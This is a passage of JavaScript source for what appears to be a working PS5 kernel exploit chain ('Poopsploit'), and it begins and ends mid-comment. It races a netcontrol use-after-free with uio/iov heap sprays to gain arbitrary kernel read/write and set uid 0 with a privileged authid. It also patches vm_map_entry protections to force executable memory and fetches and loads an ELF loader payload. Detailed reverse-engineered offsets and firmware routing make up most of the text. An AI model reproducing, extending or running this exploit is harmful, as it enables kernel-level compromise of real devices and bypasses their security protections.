     * built from mrd/vrd/mrf/vrf slow reads that ALL already passed isKernelPtr,
     * so a fast read that IS a kernel pointer is almost certainly correct. A
     * landed run 2026-08-08 burned all 6 KRW_slow_ptr retries here (persistent
     * 0x41 desync) while the fast pipe was fine. So: if the slow reference
     * converges, require an exact match (still catches a genuinely bad fast
     * pipe); if it cannot converge, accept the fast read when it is a valid
     * kernel pointer and proceed. */
    const chk = KRW.r64(ST.kq_fdp);
    let ref = 0n, refOk = false;
    try { ref = KRW_slow_ptr(ST.kq_fdp, "krw-verify"); refOk = true; }
    catch (e) {
        beacon("krw-verify slow ref stuck (" + String(e && e.message).slice(0, 24) + ")");
    }
    if (refOk) {
        if (chk !== ref) {
            beacon("KRW MISMATCH fast=" + hex(chk) + " slow=" + hex(ref));
            throw new Error("slow rw: pipe KRW does not agree with slow read "
                            + "(fast=" + hex(chk) + " slow=" + hex(ref) + ")");
        }
        beacon("phase: arbitrary kernel R/W achieved (fast==slow)");
    } else {
        if (!isKernelPtr(chk)) {
            beacon("KRW BAD fast=" + hex(chk) + " not-kptr, slow ref stuck");
            throw new Error("slow rw: fast pipe read " + hex(chk)
                            + " not a kernel pointer and slow ref did not converge");
        }
        beacon("phase: arbitrary kernel R/W achieved (fast=kptr, slow flaky-accepted)");
    }

    // the pipes now carry all kernel R/W - make sure nothing can reclaim them
    fhold(fget(ST.master_pipe[0]));
    fhold(fget(ST.master_pipe[1]));
    fhold(fget(ST.victim_pipe[0]));
    fhold(fget(ST.victim_pipe[1]));

    // drop the dangling rthdr pointers before anything can free the chunk again
    remove_rthdr_from_socket(ST.ipv6_socks[ST.triplets[0]]);
    remove_rthdr_from_socket(ST.ipv6_socks[ST.triplets[1]]);
    remove_rthdr_from_socket(ST.ipv6_socks[ST.triplets[2]]);

    // and take the triple-freed file back off the free list
    remove_uaf_file();
    beacon("phase: post-KRW cleanup done");
}

/* ------------------------------------------------- slow R/W over the UAF */

// poops.c kread_slow / kwrite_slow. Used only to install the pipe pair; once
// KRW is live everything goes through that instead, because this path costs a
// full uio+iov reclaim race per call.
//
// [PS5] deltas from netctrl.js's PS4 version, all load-bearing:
//   * SO_SNDBUF is size * UIO_THREAD_NUM, not size. Undersizing it stalls the
//     queue fill and the reclaim never converges.
//   * the triplet free order is SWAPPED — PS5 frees triplets[1] for the uio
//     stage and triplets[2] for the iov stage; PS4 does the reverse.
//   * leak lengths are explicit (0x10 for the uio probe, 0x40 for the iov
//     probe) rather than sizeof(struct).
//   * after each call both triplets are re-acquired, since the reclaim
//     consumed them.

function build_uio(uioBuf, uio_iov, uio_td, is_read, addr, size) {  // poops.c:822
    wr64at(uioBuf, 0x00, uio_iov);
    wr64at(uioBuf, 0x08, UIO_IOV_NUM);
    wr64at(uioBuf, 0x10, 0xFFFFFFFFFFFFFFFFn);          // uio_offset = -1
    wr64at(uioBuf, 0x18, size);                         // uio_resid
    wr32at(uioBuf, 0x20, UIO_SYSSPACE);                 // uio_segflg
    wr32at(uioBuf, 0x24, is_read ? UIO_WRITE : UIO_READ);
    wr64at(uioBuf, 0x28, uio_td);
    wr64at(uioBuf, 0x30, addr);                         // iov_base
    wr64at(uioBuf, 0x38, size);                         // iov_len
}

function set_sndbuf(fd, size) {
    const p = mem.alloc(4);
    wr32at(p, 0, size * UIO_THREAD_NUM);                // [PS5] x UIO_THREAD_NUM
    return sys.setsockopt(fd, SOL_SOCKET, SO_SNDBUF, p, 4);
}

// Spin the uio reclaim until an aliased uio lands in the freed rthdr.
function reclaim_uio(cmd, size, buf, leak_bufs) {
    for (let round = 0; round < UIO_SPRAY_ROUNDS; round++) {
        threads.signal("uio", cmd);
        sys.sched_yield();

        wr32at(ST.leak_rthdr, 0x08, 0);          // same stale-read hazard
        setLeakLen(0x10);
        get_rthdr(ST.ipv6_socks[ST.triplets[0]], ST.leak_rthdr, ST.leak_len_ptr);
        if (rd32at(ST.leak_len_ptr, 0) >= 0x10 &&
            rd32at(ST.leak_rthdr, 0x08) === UIO_IOV_NUM)
            return rd64at(ST.leak_rthdr, 0x00);          // uio_iov pointer

        if (cmd === COMMAND_UIO_READ) {
            read_wait(ST.uio_ss[0], ST.tmp, size);
            // only as many as were really spawned - see kread_slow
            for (let i = 0; i < Math.max(0, threads.lastSpawn.uio); i++)
                read_wait(ST.uio_ss[0], leak_bufs[i], size);
            threads.wait("uio");
            write_wait(ST.uio_ss[1], ST.tmp, size);
        } else {
            for (let i = 0; i < Math.max(0, threads.lastSpawn.uio); i++)
                write_wait(ST.uio_ss[1], buf, size);
            threads.wait("uio");
        }
    }
    throw new Error("slow rw: uio reclaim did not converge (cmd=" + cmd
                    + " size=" + size + " triplets=" + ST.triplets.join("/") + ")");
}

// Then reclaim that uio with a controlled iov so the kernel copies to/from the
// address we chose.
function reclaim_iov_over_uio() {
    let last = -1;
    /* Sampled AT CHECK TIME, which is the only moment that means anything.
     * liveAtCheck is the real question: spawned=4 says thr_new succeeded, not
     * that the threads PARKED holding their iov. If leftover data in iov_ss[0]
     * makes recvmsg return immediately, the iov is allocated and freed in the
     * same breath and can never occupy the freed chunk - which would look
     * exactly like the spray "not landing".
     * nonzero counts rounds where SOMETHING reclaimed the chunk, separating
     * "never reclaimed at all" from "reclaimed with the wrong content". */
    let liveAtCheck = -1, nonzero = 0, seen = 0, gotLen = -1, maxLen = -1;
    for (let round = 0; round < IOV_SPRAY_ROUNDS; round++) {
        threads.signal("iov", 0);
        sys.sched_yield();

        if (round < 4 || (round & 0x3F) === 0)
            liveAtCheck = threads.liveCount("iov");

        /* Clear the landing zone first. RE (ip6_ctloutput 0xFFFFFFFF80862BA0,
         * IPV6_RTHDR arm) shows the copy-out length is
         *     (ip6r_len + 1) * 8,  ip6r_len = byte 1 OF THE CHUNK ITSELF
         * and 0 when ip6po_rthdr is NULL. So a zeroed/free chunk copies only
         * 8 bytes and offset 0x20 is never written - leaving whatever we read
         * last time, which we were then scoring as "the chunk contains 0".
         * nonzeroRounds=0/512 was that artefact, not evidence about the spray. */
        wr32at(ST.leak_rthdr, 0x20, 0);
        setLeakLen(0x40);
        get_rthdr(ST.ipv6_socks[ST.triplets[0]], ST.leak_rthdr, ST.leak_len_ptr);
        gotLen = rd32at(ST.leak_len_ptr, 0);      // what the kernel ACTUALLY copied
        if (gotLen > maxLen) maxLen = gotLen;
        last = rd32at(ST.leak_rthdr, 0x20);
        if (last !== 0) { nonzero++; seen = last; }
        if (last === UIO_SYSSPACE) return true;

        wake_iov();                     // 1 byte, releases all of them
        barrier_iov();
        threads.wait("iov");
        reclaim_iov();                  // byte survives the faulting copyout
    }
    /* Split across short beacons. A single long message gets TRUNCATED on the
     * beacon path - the previous build lost "head=" entirely, cutting off mid
     * word at "lastNon" - so the one field we were waiting on never reached
     * the wire. Keep each line well under the limit. */
    beacon("rio A nz=" + nonzero + " len=" + gotLen + "/" + maxLen
           + " spawn=" + threads.lastSpawn.iov + " live=" + liveAtCheck);
    beacon("rio B head=" + [0x00, 0x08, 0x18, 0x20].map(function (o) {
               return rd64at(ST.leak_rthdr, o).toString(16);
           }).join(" "));
    beacon("rio C trip=" + ST.triplets.join("/") + " resid=" + iov_resid());
    /* Did the spray land ANYWHERE? 150 getsockopt is ~33 ms, once, on the
     * failure path - cheap, and it separates "the iov never lands" from "it
     * lands in a socket we are not watching", which need opposite fixes. */
    const hits = [];
    for (let i = 0; i < IPV6_SOCK_NUM && hits.length < 6; i++) {
        wr32at(ST.leak_rthdr, 0x20, 0);
        setLeakLen(0x40);
        get_rthdr(ST.ipv6_socks[i], ST.leak_rthdr, ST.leak_len_ptr);
        if (rd32at(ST.leak_rthdr, 0x20) === UIO_SYSSPACE) hits.push(i);
    }
    beacon("rio D syssspace_at=" + (hits.length ? hits.join(",") : "none"));
    throw new Error("slow rw: iov-over-uio reclaim did not converge");
}

function reacquire_triplets() {
    wake_iov();                         // one full uio_resid per thread
    const t2 = find_triplet(ST.triplets[0], ST.triplets[1]);
    if (t2 < 0) throw new Error("slow rw: triplet[2] lost");
    ST.triplets[2] = t2;
    // upstream order: write 1 byte, find the triplet, THEN waitForFinished,
    // then read the byte back (Poops.java ~807-818)
    barrier_iov();
    threads.wait("iov");
    reclaim_iov();
}

function kread_slow(addr, size) {
    /* Last check before the kernel bcopies from this address with no fault
     * protection (uiomove 0xFFFFFFFF809ABDA0, UIO_SYSSPACE branch). Throwing
     * costs us a run; not throwing costs a panic, a reboot, and every beacon
     * that would have explained it. */
    if (!isKernelPtr(addr))
        throw new Error("slow rw: refusing kread_slow from non-kernel addr "
                        + hex(addr) + " (size " + size + ") — would panic");

    const leak_bufs = [];
    for (let i = 0; i < UIO_THREAD_NUM; i++) {
        const b = mem.alloc(size);
        mem.bset(b, size, 0x00);
        leak_bufs.push(b);
    }

    set_sndbuf(ST.uio_ss[1], size);
    mem.bset(ST.tmp, size, 0x41);                 // 0x41 marks "not our data"
    write_wait(ST.uio_ss[1], ST.tmp, size);

    wr64at(ST.uio_iov_read, 0x08, size);          // iov_len

    free_rthdr(ST.ipv6_socks[ST.triplets[1]]);    // [PS5] triplets[1], not [2]
    const uio_iov_ptr = reclaim_uio(COMMAND_UIO_READ, size, 0n, leak_bufs);

    build_uio(ST.msg_iov, uio_iov_ptr, 0n, 1, addr, size);

    ST._t2before = rthdr_len(ST.ipv6_socks[ST.triplets[2]]);
    free_rthdr(ST.ipv6_socks[ST.triplets[2]]);    // [PS5] triplets[2] second

    /* Probe the gap. reclaim_uio just read a valid uio pointer out of
     * triplets[0], so the alias and the read path both work - yet moments
     * later reclaim_iov_over_uio sees 0 at offset 0x20 on all 512 rounds, not
     * once. Something changes across this free. Dump the head of the chunk
     * BEFORE any iov spray runs:
     *   old uio content  -> alias is live, free works, spray is the problem
     *   all zeroes       -> the chunk is zeroed on free, or getsockopt is no
     *                       longer returning this socket's rthdr at all
     * One beacon, first call only. */
    if (!ST._probed) {
        ST._probed = 1;
        /* Does the free actually free, and is triplets[0] really aliased to
         * triplets[2]? t2 should drop to 0 (NULL rthdr). If t0 stays non-zero
         * it is dangling at the same chunk, which is the alias we depend on.
         * If t2 was ALREADY 0 before the free, the free was a no-op and the
         * chunk we spray at was never on the free list. */
        beacon("rio P t2 " + ST._t2before + "->" + rthdr_len(ST.ipv6_socks[ST.triplets[2]])
               + " t0=" + rthdr_len(ST.ipv6_socks[ST.triplets[0]]));
        setLeakLen(0x40);
        get_rthdr(ST.ipv6_socks[ST.triplets[0]], ST.leak_rthdr, ST.leak_len_ptr);
        let h = "";
        for (let o = 0; o < 0x28; o += 8)
            h += rd64at(ST.leak_rthdr, o).toString(16) + " ";
        beacon("probe after free_rthdr(t2): len=" + rd32at(ST.leak_len_ptr, 0)
               + " head=" + h);
    }

    reclaim_iov_over_uio();

    /* The priming read MUST consume exactly our `size` marker bytes. If it
     * comes up short the remainder stays queued and every leak buffer after it
     * is offset by that many bytes - which is why the fast/slow cross-check
     * disagreed only in the low byte, the slow value carrying a stray 0x41
     * marker at the front (fast=0x..4a920000 slow=0x..4a920041).
     *
     * A desynced stream cannot be salvaged by reading further, so drain
     * whatever is queued and fail this attempt; KRW_slow_ptr retries. */
    const primed = read_wait(ST.uio_ss[0], ST.tmp, size);
    if (primed !== size) {
        for (let d = 0; d < 64 && read_nb(ST.uio_ss[0], ST.tmp, PAGE_SIZE) > 0; d++) { }
        throw new Error("slow rw: priming read short (" + primed + "/" + size
                        + ") — uio stream desynced");
    }

    /* Read one buffer per uio thread that ACTUALLY EXISTS, not a fixed
     * UIO_THREAD_NUM. Each blocked writev contributes `size` bytes; a thread
     * the liveness gate skipped contributes none, and the extra read then
     * blocks forever - wedging the hijacked worker. That is the
     * "'read' (3) ... sync poll timed out" we just hit, the first time the
     * reclaim converged far enough to reach this code. */
    const nUio = Math.max(0, threads.lastSpawn.uio);
    let result = 0n;
    for (let i = 0; i < nUio; i++) {
        /* Only trust a buffer that received the FULL transfer. read_wait can
         * return short (that is the point - it must not block), and a
         * partially filled buffer holding a single 0x41 marker byte reads back
         * as 0x0000000000000041, which sails past an "is it all 0x41" test and
         * gets handed on as a kernel pointer. That is exactly the
         * "kwrite_slow to non-kernel addr 0x41" we just hit: a short read
         * masquerading as leaked data. */
        const got = read_wait(ST.uio_ss[0], leak_bufs[i], size);
        if (got < size) continue;
        /* Reject BOTH sentinel states, not just the marker.
         *
         * leak_bufs start as 0x00 and ST.tmp is filled with 0x41, so a buffer
         * can be 'not our data' two ways: it took the 0x41 priming bytes, or
         * it received NOTHING and is still zero. The old test caught only the
         * first, so an untouched all-zero buffer was returned as a successful
         * read - which is why KRW_slow_ptr saw vrd come back 0x0 (and
         * occasionally 0x41) eight retries running. */
        const head = rd64at(leak_bufs[i], 0x00);
        if (head !== 0x4141414141414141n && head !== 0n) {
            const t1 = find_triplet(ST.triplets[0], -1);
            if (t1 < 0) throw new Error("slow rw: triplet[1] lost");
            ST.triplets[1] = t1;
            result = leak_bufs[i];
        }
    }
    threads.wait("uio");
    reacquire_triplets();

    if (result === 0n) throw new Error("slow rw: no worker received the read");
    return result;                                 // pointer to `size` bytes
}

function kwrite_slow(addr, buf, size) {
    // same UIO_SYSSPACE bcopy, same non-recoverable failure — see kread_slow
    if (!isKernelPtr(addr))
        throw new Error("slow rw: refusing kwrite_slow to non-kernel addr "
                        + hex(addr) + " (size " + size + ") — would panic");

    set_sndbuf(ST.uio_ss[1], size);
    wr64at(ST.uio_iov_write, 0x08, size);

    free_rthdr(ST.ipv6_socks[ST.triplets[1]]);
    const uio_iov_ptr = reclaim_uio(COMMAND_UIO_WRITE, size, buf, null);

    build_uio(ST.msg_iov, uio_iov_ptr, 0n, 0, addr, size);

    free_rthdr(ST.ipv6_socks[ST.triplets[2]]);
    reclaim_iov_over_uio();

    for (let i = 0; i < UIO_THREAD_NUM; i++)
        write_wait(ST.uio_ss[1], buf, size);

    const t1 = find_triplet(ST.triplets[0], -1);
    if (t1 < 0) throw new Error("slow rw: triplet[1] lost");
    ST.triplets[1] = t1;
    threads.wait("uio");
    reacquire_triplets();
}

function KRW_slow_r64(addr) {
    const p = kread_slow(BigInt(addr), 8);
    /* Keep the raw buffer so a rejected read can show its BYTES.
     *
     * "bad=0xa100000000000000" is not enough to act on: a one-byte copyout
     * desync (the documented soreceive fault path), a 0x41 sentinel, an all-zero
     * buffer and a genuinely wrong address all reduce to a single hex qword that
     * looks equally wrong. The byte pattern separates them — 0x41 repeats say
     * sentinel, a kernel pointer shifted by one or seven bytes says desync, and
     * plausible non-pointer data says we read the wrong place. */
    ST.lastLeak = p;
    return rd64at(p, 0x00);
}

// Hex dump of the last slow-read buffer, for failure beacons.
function lastLeakBytes(n) {
    if (!ST.lastLeak) return "?";
    let s = "";
    for (let i = 0; i < (n || 8); i++) {
        const b = Number(rd8(ST.lastLeak, i)) & 0xff;
        s += (b < 16 ? "0" : "") + b.toString(16);
    }
    return s;
}

function KRW_slow_write(dst, src, n) {
    kwrite_slow(BigInt(dst), BigInt(src), n);
}

function run() {
    // The usable window is the INTERSECTION of the two stages, not poops'
    // own range: slopkit's WebKit primitive only exists from 9.00 (which is
    // why its offsets.json starts at "09.00"), and the netcontrol bug dies
    // after 12.00. Below 9.00 the kernel bug is still there but nothing here
    // can reach it, so gating on poops.lua's 4.03 would promise a chain that
    // cannot start.
    let dirtyBefore = false;
    try { dirtyBefore = sessionStorage.getItem("netctrl_dirty") === "1"; } catch (e) {}
    if (dirtyBefore)
        throw new Error("netctrl-ps5: a previous attempt already double-freed a "
                        + "ucred — REBOOT before retrying (re-arming on that "
                        + "state is what panics the console)");

    let wedgedBefore = false;
    try { wedgedBefore = sessionStorage.getItem("netctrl_wedged") === "1"; } catch (e) {}
    // and drop any stale localStorage flag from the earlier, too-sticky version
    try { localStorage.removeItem("netctrl_wedged"); } catch (e) {}
    if (window.NETCTRL_WEDGED || wedgedBefore)
        throw new Error("netctrl-ps5: a previous attempt wedged a thread in "
                        + "the kernel — REBOOT the console before retrying "
                        + "(clears itself on reboot)");

    const fw = parseFloat((window.slopkit && window.slopkit.FW_VERSION) || "0");
    const fwk = sk_fw();
    log("PS5 kernel stage — fw " + fwk);
    if (fw < 9.00) {
        log("fw " + fw + " below slopkit's WebKit floor (9.00) — kernel bug is " +
            "present but there is no userland R/W to drive it from");
        return false;
    }
    /* THREE kernel bugs, and they PARTITION the firmware range — no overlap,
     * so the firmware alone picks the route:
     *
     *   09.00 - 10.01   lapse   aio double free      (lapse-ps5.js)
     *   10.20 - 12.00   poops   netcontrol UAF       (this file)
     *   12.02 - 12.70   p2jb    cr_refcnt overflow   (this file)
     *
     * This used to claim netcontrol for 09.00-12.00, which overstated it by six
     * firmwares: 09.00 through 10.01 are lapse's window, not netcontrol's.
     * Sending one of those down the netcontrol path would grind find_twins
     * against a bug that is not there and report it as a lost race — the exact
     * failure mode that is hardest to tell from a real one.
     *
     * Everything after the double free is shared, so this is the only fork. */
    if (LAPSE_FIRMWARES_KERNEL.has(fwk)) {
        log("fw " + fwk + " is lapse's window (09.00-10.01), not netcontrol's — "
            + "load lapse-ps5.js and call lapse_ps5.run()");
        return false;
    }
    const useP2jb = P2JB_FIRMWARES.has(fwk);
    if (!useP2jb && !NETCTRL_FIRMWARES.has(fwk)) {
        log("fw " + fwk + " has no kernel route (lapse 09.00-10.01, "
            + "netcontrol 10.20-12.00, p2jb 12.02-12.70)");
        return false;
    }

    /* Every phase is bracketed by a log line. With NETCTRL_TRACE those become
     * synchronous beacons, so the last one received names the phase that died.
     * Without the brackets a crash inside bindRuntime/SYM.attach/preflight
     * reports nothing at all - which is exactly the hole the armed run fell
     * into: no NETCTRL-RUN, no NETCTRL-THREW, just a dead renderer. */
    bindRuntime();     log("runtime bound");
    SYM.attach();      log("symbols attached");
    preflight();
    init();
    setup();           log("setup returned");

    /* Trace is valuable through the deterministic setup and actively harmful
     * from here on: every stage line is a SYNCHRONOUS XHR, and a blocking HTTP
     * round trip between stages destroys exactly the window the triple-free is
     * racing for. So keep the beacons for everything above - where a failure
     * is a bug we want localised - and go quiet for the race, where a failure
     * is just a lost race and timing is what matters.
     * The page's own markers (NETCTRL-RUN / NETCTRL-THREW) still report the
     * outcome, so this is not a return to being blind. */
    if (window.NETCTRL_TRACE_RACE === 0 || window.NETCTRL_TRACE_RACE === undefined) {
        const scr = (window.slopkit && window.slopkit.screenLine)
                    || console.log.bind(console);
        log("tracing off for the race (timing)");
        R.log = scr;
    }

    /* Measure the primitive before the race, so "our syscalls are too slow"
     * stops being speculation. Both reference implementations call syscalls
     * natively; ours is a Worker postMessage plus a busy-poll. That ratio is
     * what decides whether upstream's attempt counts are reachable at all, and
     * one beacon settles it. */
    const _t0 = Date.now();
    for (let _i = 0; _i < 200; _i++) sys.getpid();
    const _per = (Date.now() - _t0) / 200;
    beacon("syscall " + _per.toFixed(3) + " ms; find_twins worst case "
           + Math.round(TWIN_ATTEMPTS * IPV6_SOCK_NUM * 2 * _per / 1000) + " s");

    if (useP2jb) {
        beacon("route: p2jb (cr_refcnt overflow) — expect ~50 min of spinning");
        ucred_triple_free_p2jb();
    } else {
        ucred_triple_free();
    }
    leak_kqueue();
    make_karw();
    find_allproc();
    ps5_jailbreak();

    /* ---- proof of jailbreak, and the one probe that decides elfldr --------
     *
     * A successful run used to end with a bare NETCTRL-RUN and nothing usable.
     * These beacons are unconditional so a rare success actually yields
     * something, and they cost nothing on the failure paths (we never get
     * here).
     *
     * The mprotect probe answers the question that gates the whole ELF loader:
     * elfldr needs RWX memory, and mmap is PROVEN unreachable from our chain -
     * it takes 6 args and there is no r9-setting gadget anywhere in
     * libSceNKWebKit or libkernel_web (scanned for pop r9, xor r9/r9,
     * mov r9,<reg>, mov r9d,0: zero hits). mprotect takes THREE args, so it is
     * reachable; whether the kernel grants PROT_EXEC is the unknown. If it
     * does, elfldr is a straight port from here. If it does not, we now hold
     * kernel R/W and can patch the vm_map entry's max_protection instead. */
    try {
        beacon("JB uid=" + KRW.r32(KRW.r64(ST.curproc + 0x40n) + 0x04n)
               + " authid=" + hex(KRW.r64(KRW.r64(ST.curproc + 0x40n) + 0x58n)));
        beacon("JB curproc=" + hex(ST.curproc) + " allproc=" + hex(ST.allproc));
    } catch (e) { beacon("JB proof failed: " + e.message); }

    /* Everything below this point WRITES kernel memory — force_exec() stamps
     * protection bits into a vm_map_entry, buildLapseKRW() rewrites a socket's
     * pktopts, and elfldr is handed a kdata_base it keys all its own kernel
     * offsets off. None of that is safe unless the jailbreak actually landed.
     *
     * It used to run unconditionally. The proof above is inside a try/catch
     * that only BEACONS a failure, so a run where ps5_jailbreak() did not take
     * — or where KRW is returning garbage — would print "KERNEL EXPLOITED",
     * then compute kdata_base from a bogus allproc and let elfldr write to
     * whatever kernel addresses that implies. That is the same "wrong is worse
     * than missing" hazard as the hardcoded kdata_base, at whole-jailbreak
     * scale, and it ends in a panic rather than an error message.
     *
     * So prove it first, and refuse rather than guess. */
    function verifyJailbreak() {
        const no = (why) => { beacon("JB VERIFY FAILED: " + why); return false; };

        if (!isKernelPtr(ST.curproc)) return no("curproc " + hex(ST.curproc));
        if (!isKernelPtr(ST.allproc)) return no("allproc " + hex(ST.allproc));

        let ucred, uid, authid;
        try {
            ucred = KRW.r64(ST.curproc + 0x40n);
            if (!isKernelPtr(ucred)) return no("ucred " + hex(ucred));
            uid    = KRW.r32(ucred + 0x04n);
            authid = KRW.r64(ucred + 0x58n);
        } catch (e) { return no("kernel read threw: " + e.message); }

        // ps5_jailbreak() sets both of these; if either is unchanged the
        // escalation did not take even though nothing threw.
        if (uid !== 0) return no("uid=" + uid + " (expected 0)");
        if (authid !== SYSCORE_AUTHID)
            return no("authid=" + hex(authid) + " expected " + hex(SYSCORE_AUTHID));

        /* kdata_base is the one value elfldr cannot sanity-check for itself.
         * Every kernel in the 9.00-12.00 window has it 64 KB aligned
         * (text_base + text_size: 0x...EB0000 / ED0000 / F40000 / F60000), so a
         * garbage allproc almost never produces an aligned result. KASLR moves
         * the absolute value, which is why alignment is checked and not it. */
        let kdata;
        try { kdata = computeKdataBase(); } catch (e) { return no(e.message); }
        if (!isKernelPtr(kdata) || (kdata & 0xFFFFn) !== 0n)
            return no("kdata_base implausible: " + hex(kdata));

        beacon("JB VERIFIED uid=0 authid=" + hex(authid)
               + " kdata_base=" + hex(kdata));
        return true;
    }

    if (!verifyJailbreak()) {
        beacon("phase: NOT JAILBROKEN — skipping force_exec/elfldr");
        log("jailbreak did not verify; refusing to write kernel memory or "
            + "start elfldr (reboot before retrying)");
        return false;
    }

    // on-screen notification: kernel is exploited (uid=0, arbitrary kernel R/W)
    sendNotification("Poopsploit: KERNEL EXPLOITED (uid=0, kernel R/W)");

    /* ---- force PROT_EXEC on one page, so elfldr has somewhere to live ----
     *
     * RE'd on 10.00 (pass 48):
     *   sys_mprotect  0xFFFFFFFF80CC6820 calls vm_map_protect 0xFFFFFFFF80527B30
     *     with td->td_proc->p_vmspace  =>  proc + 0x200, and the vm_map IS the
     *     vmspace (passed straight in, map at +0).
     *   vm_map_protect refuses with:
     *       v16 = *(u16 *)(entry + 102);            // max_protection
     *       if ((u16)~v16 & (u16)new_prot) -> KERN_PROTECTION_FAILURE (2)
     *   and the KERN->errno table at 0xFFFFFFFF81AC3758 maps 2 -> 13 (EACCES),
     *   which is exactly what the probe returned.
     *   Fields are SIXTEEN bit here, not the classic 3-bit vm_prot_t:
     *       entry + 100 (0x64) = protection
     *       entry + 102 (0x66) = max_protection
     *   Entry list is circular through the map itself (the header is the map),
     *   next at +8, start at +32, end at +40.
     *
     * Those numbers were RE'd on 10.00 alone, which was fine while the chain only
     * ran on 10.x. It is not fine now: this function WRITES kernel memory, so a
     * struct that shifted on 11.x or 12.x would mean stamping protection bits
     * into some unrelated vm_map_entry. So every constant was re-checked against
     * all fourteen kernels in ps5_kernel_collection for 09.00-12.00, and all
     * four hold unchanged on every one of them:
     *   - vm_map_lookup_entry reads map->root at +0x1D0 (464) and tests
     *     entry->start +0x20 / entry->end +0x28  (unique signature match, 14/14)
     *   - vm_map_entry_splay rotates through left +0x10 / right +0x18, which is
     *     the traversal this walker copies                      (14/14)
     *   - vm_map_protect's refusal reads max_protection as a 16-bit word at
     *     +0x66, and protection/max_protection are read as a +0x64/+0x66 pair
     *     elsewhere, confirming BOTH halves of the 32-bit access below (14/14)
     *   - sys_mprotect derefs td->td_proc->p_vmspace at proc +0x200   (14/14)
     *
     * So: find the entry covering our page and set both fields, then let the
     * normal mprotect succeed. Heavily guarded - this writes kernel memory, so
     * every pointer is range-checked and we only touch an entry that actually
     * brackets our address. */
    function force_exec(addr) {
        const vmspace = KRW.r64(ST.curproc + 0x200n);
        if (!isKernelPtr(vmspace)) { beacon("force_exec: bad vmspace"); return false; }
        const map = vmspace;                       // vm_map at vmspace+0

        /* vm_map entries are a BINARY SEARCH TREE, not a linked list.
         * RE'd from vm_map_lookup_entry (0xFFFFFFFF80522A00):
         *     if ( v3[4] <= a2 && v3[5] > a2 )   // start +32, end +40
         *     v3 = v3[2];                        // +16 LEFT
         *     v3 = v3[3];                        // +24 RIGHT
         * with the root cached at map+464. An earlier version of this walked
         * *(entry+8) from map+8 as though it were a circular list - that is not
         * the list at all, and since this function WRITES kernel memory it
         * would have stamped protection bits into an unrelated mapping. */
        let e = KRW.r64(map + 464n);               // map->root
        for (let i = 0; i < 128 && isKernelPtr(e); i++) {
            const st = KRW.r64(e + 32n), en = KRW.r64(e + 40n);
            if (addr < st)       { e = KRW.r64(e + 16n); continue; }   // left
            if (addr >= en)      { e = KRW.r64(e + 24n); continue; }   // right
            {
                /* protection (+100) and max_protection (+102) are adjacent
                 * u16s, so one 32-bit access carries both: low half is
                 * protection, high half is max_protection. */
                const both = KRW.r32(e + 100n) >>> 0;
                const prot = both & 0xFFFF, mx = (both >>> 16) & 0xFFFF;
                beacon("force_exec entry=" + hex(e) + " prot=0x" + prot.toString(16)
                       + " max=0x" + mx.toString(16));
                const nprot = (prot | 7) & 0xFFFF, nmax = (mx | 7) & 0xFFFF;
                KRW.w32(e + 100n, ((nmax << 16) | nprot) >>> 0);
                const chk = KRW.r32(e + 100n) >>> 0;
                beacon("force_exec now prot=0x" + (chk & 0xFFFF).toString(16)
                       + " max=0x" + ((chk >>> 16) & 0xFFFF).toString(16));
                return true;
            }
        }
        beacon("force_exec: no entry covers " + hex(addr));
        return false;
    }

    /* ===================================================================
     * elfldr loader.  RE basis: E:\POOPKIT\WORKING.txt (elfldr load contract,
     * resolver spec) + elfldr passes 52-56.
     *
     * elfldr-ps5-1360.elf is ET_DYN (PIE), entry 0x46B8, LOAD0 RWX 0..0xCEC8,
     * LOAD1/2 RW, DYNAMIC@0x18000 -> 164 RELA (140 R_X86_64_RELATIVE).
     * Entry ABI = ps5-payload-sdk payload_args_t* in rdi:
     *   +0 dlsym  +8 rwpipe*  +0x10 rwpair*  +0x18 kpipe_addr
     *   +0x20 kdata_base  +0x28 payloadout*
     * dlsym = a native stub invoking syscall 591 (sys_dynlib_dlsym); the kernel
     * hashes NIDs (userland NID hashing is a proven dead end).
     * elfldr's own kernel R/W (sub_7730/7540) is the LAPSE primitive:
     *   setsockopt(rwpair[i], IPPROTO_IPV6=41, opt=46, {kpipe_addr...}, 20)
     *   then read(rwpipe[0])/write(rwpipe[1]).  This is NOT netctrl's SIGIO KRW,
     *   so buildLapseKRW() must construct it (see its spec).                 */
    const SYS_DYNLIB_DLSYM = 591;
    const R_X86_64_RELATIVE = 8;

    /* The payload is NOT a 13.60-only build despite the name, and no per-firmware
     * elfldr needs to be produced for this port.
     *
     * elfldr picks its own kernel offsets at runtime: its init routine (sub_6820)
     * reads the running firmware version and switches on it, and that switch
     * covers 1.00 through 13.60 — every firmware in this chain's 9.00-12.00
     * window is an explicit case with its own offset set. So one binary serves
     * all of them, and the only per-firmware thing WE owe it is a correct
     * kdata_base (see ALLPROC_TO_KDATA / computeKdataBase below).
     *
     * The filename is kept as-is so already-hosted copies keep working; it is a
     * misnomer, not a version constraint. If elfldr is ever rebuilt, the one
     * thing to re-check is that switch, because a firmware it does not recognise
     * makes its init return early and the payload never comes up. */
    const ELFLDR_URL = "elfldr-ps5-1360.elf";

    // sync-fetch a served binary as a byte array (x-user-defined keeps bytes 1:1)
    function fetchBytes(url) {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", url, false);
        xhr.overrideMimeType("text/plain; charset=x-user-defined");
        xhr.send(null);
        if (xhr.status !== 200 && xhr.status !== 0)
            throw new Error("fetch " + url + " HTTP " + xhr.status);
        const s = xhr.responseText, b = new Uint8Array(s.length);
        for (let i = 0; i < s.length; i++) b[i] = s.charCodeAt(i) & 0xff;
        return b;
    }

    // write a JS byte array into userland memory at addr (8 bytes at a time)
    function writeBytes(addr, bytes, off, len) {
        const a = BigInt(addr);
        let i = 0;
        for (; i + 8 <= len; i += 8) {
            let v = 0n;
            for (let k = 7; k >= 0; k--) v = (v << 8n) | BigInt(bytes[off + i + k]);
            R.wr64(a + BigInt(i), v);
        }
        for (; i < len; i++) R.wr8(a, i, bytes[off + i]);
    }

    /* LAPSE KRW PRIMITIVE — required by elfldr's sub_7730/7540. NOT YET BUILT.
     * Spec (from elfldr KRW RE + umtx2 krw):
     *   rwpipe  = a pipe2() pair [r,w]; bytes move via read(r)/write(w).
     *   rwpair  = two IPv6 UDP sockets; each gets an ip6po_pktopts whose rthdr
     *             descriptor is aliased (via our KRW) onto the pipe's buffer, so
     *             setsockopt(sock, 41, 46, {addr,len 0x40000000}, 20) reprograms
     *             the pipe's data pointer to an arbitrary kaddr.
     *   kpipe_addr = kernel address of that pipe buffer / pktopts (found by
     *             walking curproc fd table with KRW to the struct pipe).
